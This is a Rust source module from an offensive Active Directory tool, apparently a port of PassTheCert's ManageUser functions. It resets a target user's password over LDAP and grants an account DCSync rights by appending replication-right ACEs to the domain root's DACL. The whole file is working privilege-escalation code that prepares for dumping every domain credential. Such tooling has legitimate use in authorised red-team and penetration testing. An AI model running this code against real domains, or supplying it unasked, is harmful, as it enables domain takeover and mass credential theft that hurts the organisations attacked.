//! modify_user: reset password or grant DCSync rights.
//! Mirrors PassTheCert ManageUser.changePWD / ManageUser.elevate.

use std::collections::HashSet;

use anyhow::{anyhow, Result};
use ldap3::controls::RawControl;
use ldap3::{Ldap, Mod, Scope, SearchEntry};
use log::info;

use crate::args::Options;
use super::sd;

/// DCSync extended-right GUIDs (DS-Replication-Get-Changes*).
const DCSYNC_GUIDS: &[&str] = &[
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", // DS-Replication-Get-Changes
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", // DS-Replication-Get-Changes-All
    "89e95b76-444d-4c62-991a-0facbeda640c", // DS-Replication-Get-Changes-In-Filtered-Set
];

/// LDAP_SERVER_SD_FLAGS_OID control requesting/writing only the DACL portion of
/// nTSecurityDescriptor (DACL_SECURITY_INFORMATION = 0x04). Without it, AD
/// returns/expects a partial SD and rejects the write with constraintViolation.
fn sd_flags_control() -> RawControl {
    RawControl {
        ctype: "1.2.840.113556.1.4.801".to_string(),
        crit: true,
        // BER: SEQUENCE { INTEGER 4 }
        val: Some(vec![0x30, 0x03, 0x02, 0x01, 0x04]),
    }
}

fn base_dn(domain: &str) -> String {
    domain.split('.').map(|p| format!("dc={p}")).collect::<Vec<_>>().join(",")
}

fn pwd_utf16(p: &str) -> Vec<u8> {
    format!("\"{p}\"").encode_utf16().flat_map(|c| c.to_le_bytes()).collect()
}

async fn find_user(ldap: &mut Ldap, base: &str, sam: &str)
    -> Result<(String, String)> // (dn, objectSid string)
{
    let filter = format!("(sAMAccountName={})", ldap3::ldap_escape(sam));
    let (rs, _) = ldap.search(base, Scope::Subtree, &filter, vec!["objectSid"])
        .await?.success()?;
    let entry = rs.into_iter().next()
        .ok_or_else(|| anyhow!("user {sam} not found in LDAP"))?;
    let se = SearchEntry::construct(entry);
    let dn = se.dn.clone();
    let raw_sid = se.bin_attrs.get("objectSid")
        .and_then(|v| v.first().cloned())
        .unwrap_or_default();
    let sid_str = sd::sid_to_str(&raw_sid);
    Ok((dn, sid_str))
}

/// Reset a user's password (unicodePwd over LDAPS — requires Domain Admin or
/// matching delegated rights).
pub async fn change_password(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.target.as_deref()
        .ok_or_else(|| anyhow!("--target required"))?;
    let base = base_dn(&opts.domain);
    let (dn, _) = find_user(ldap, &base, target).await?;

    let new_pass = opts.new_pass.clone().unwrap_or_else(|| {
        use rand::Rng;
        rand::thread_rng()
            .sample_iter(&rand::distributions::Alphanumeric)
            .take(24).map(|c| c as char).collect()
    });

    let encoded = pwd_utf16(&new_pass);
    ldap.modify(&dn, vec![Mod::Replace(b"unicodePwd".to_vec(), HashSet::from([encoded]))])
        .await?.success()
        .map_err(|e| anyhow!("password change failed (need LDAPS + sufficient rights): {e}"))?;
    info!("[+] password of '{target}' changed to: {new_pass}");
    Ok(())
}

/// Grant DCSync rights by appending 3 OBJECT_ACEs to the domain root SD.
/// Requires the certificate to be mapped to an account with Write-Dacl on the
/// domain root (e.g. a Domain Admin or a delegated operator).
pub async fn elevate(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.target.as_deref()
        .ok_or_else(|| anyhow!("--target required"))?;
    let forest_dn = base_dn(&opts.domain);

    // Resolve target SID.
    let (_, target_sid_str) = find_user(ldap, &forest_dn, target).await?;
    let target_sid = sd::sid_from_str(&target_sid_str)?;

    // Read the current DACL of the domain root (SD_FLAGS control: DACL only).
    let (rs, _) = ldap
        .with_controls(sd_flags_control())
        .search(&forest_dn, Scope::Base, "(objectClass=*)", vec!["nTSecurityDescriptor"])
        .await?
        .success()?;
    let entry = rs.into_iter().next()
        .ok_or_else(|| anyhow!("could not read domain root"))?;
    let se = SearchEntry::construct(entry);
    let raw_sd = se.bin_attrs.get("nTSecurityDescriptor")
        .and_then(|v| v.first().cloned())
        .ok_or_else(|| anyhow!("nTSecurityDescriptor not returned (need right to read it)"))?;

    // Build the 3 DCSync object-ACEs and append them to the existing SD,
    // preserving every existing ACE (do not rebuild the SD from scratch).
    let new_aces: Vec<Vec<u8>> = DCSYNC_GUIDS.iter()
        .map(|guid| sd::allow_object_ace(&target_sid, guid))
        .collect();
    let new_sd = sd::append_aces(&raw_sd, &new_aces)?;

    ldap.with_controls(sd_flags_control())
        .modify(&forest_dn, vec![Mod::Replace(
            b"nTSecurityDescriptor".to_vec(),
            HashSet::from([new_sd]),
        )])
        .await?.success()
        .map_err(|e| anyhow!("elevate failed (need WriteDacl on domain root): {e}"))?;
    info!("[+] granted {target} DCSync rights (3 object-ACEs appended)");
    Ok(())
}